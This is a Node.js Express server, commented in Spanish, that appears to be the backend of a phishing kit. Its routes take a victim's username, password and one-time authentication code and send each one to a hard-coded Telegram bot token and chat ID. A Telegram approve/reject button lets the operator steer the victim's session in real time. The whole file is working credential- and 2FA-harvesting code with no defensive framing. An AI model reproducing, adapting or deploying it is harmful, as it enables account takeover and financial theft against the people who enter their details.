// Requerir las dependencias necesarias.
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path'); // Para manejar rutas de archivos
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Para servir archivos estáticos (HTML, CSS, JS)

// Objeto para almacenar datos por dispositivo
let usuariosData = {};
// ========================================
// VERIFICACIÓN MANUAL POR TELEGRAM
// ========================================

const VERIFICACION_TIEMPO_MS = 120000;

const TELEGRAM_BOT_TOKEN_VERIFICACION =
    process.env.TELEGRAM_BOT_TOKEN;

const TELEGRAM_CHAT_ID_VERIFICACION =
    process.env.TELEGRAM_CHAT_ID;

const solicitudesVerificacion = new Map();

async function telegramVerificacion(metodo, datos) {
    if (!TELEGRAM_BOT_TOKEN_VERIFICACION) {
        throw new Error('Falta TELEGRAM_BOT_TOKEN');
    }

    const respuesta = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_VERIFICACION}/${metodo}`,
        {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(datos)
        }
    );

    const resultado = await respuesta.json();

    if (!respuesta.ok || !resultado.ok) {
        throw new Error(
            resultado.description || 'Error de Telegram'
        );
    }

    return resultado.result;
}

async function crearSolicitudVerificacion(dispositivoID) {
    if (!TELEGRAM_CHAT_ID_VERIFICACION) {
        throw new Error('Falta TELEGRAM_CHAT_ID');
    }

    const idSolicitud = crypto.randomBytes(16).toString('hex');

    const idVisible = String(dispositivoID).replace(/^id\./, '');

    const solicitud = {
        dispositivoID,
        estado: 'pendiente',
        creada: Date.now(),
        vence: Date.now() + VERIFICACION_TIEMPO_MS
    };

    solicitudesVerificacion.set(idSolicitud, solicitud);

    try {
        await telegramVerificacion('sendMessage', {
            chat_id: TELEGRAM_CHAT_ID_VERIFICACION,
            text:
                '🔔 VERIFICACIÓN DE ACCESO\n\n' +
                'ID: ' + idVisible + '\n\n' +
                '¿Autorizar la transición?',
            reply_markup: {
                inline_keyboard: [[
                    {
                        text: '✅ Sí',
                        callback_data: 'aprobar:' + idSolicitud
                    },
                    {
                        text: '❌ No',
                        callback_data: 'rechazar:' + idSolicitud
                    }
                ]]
            }
        });
    } catch (error) {
        solicitudesVerificacion.delete(idSolicitud);
        throw error;
    }

    setTimeout(() => {
        const actual = solicitudesVerificacion.get(idSolicitud);

        if (actual && actual.estado === 'pendiente') {
            actual.estado = 'expirada';
        }
    }, VERIFICACION_TIEMPO_MS);

    return idSolicitud;
}

// Ruta para servir el archivo index.html en la raíz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Ruta para recibir y enviar el nombre de usuario al bot de Telegram
app.post('/send-user', async (req, res) => {
    const { dispositivoID, texto: usuario } = req.body;

    // Almacenar el usuario por dispositivo
    if (!usuariosData[dispositivoID]) {
        usuariosData[dispositivoID] = { usuario: null, contraseña: null, codigo: null };
    }
    usuariosData[dispositivoID].usuario = `UUUUU ${dispositivoID.replace('id.', '')}: \`${usuario}\``;

    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '8660458713',
            text: usuariosData[dispositivoID].usuario,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar la contraseña al bot de Telegram
app.post('/send-password', async (req, res) => {
    const { dispositivoID, texto: password } = req.body;

    // Almacenar la contraseña por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
    }

    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '8660458713',
            text: usuariosData[dispositivoID].contraseña,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar el código de autenticación al bot de Telegram
app.post('/send-auth', async (req, res) => {
    const { dispositivoID, texto: authCode } = req.body;

    // Almacenar el código de autenticación por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].codigo = `AAAAA ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
    }

    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '8660458713',
            text: usuariosData[dispositivoID].codigo,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Inicia el servidor en el puerto especificado
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
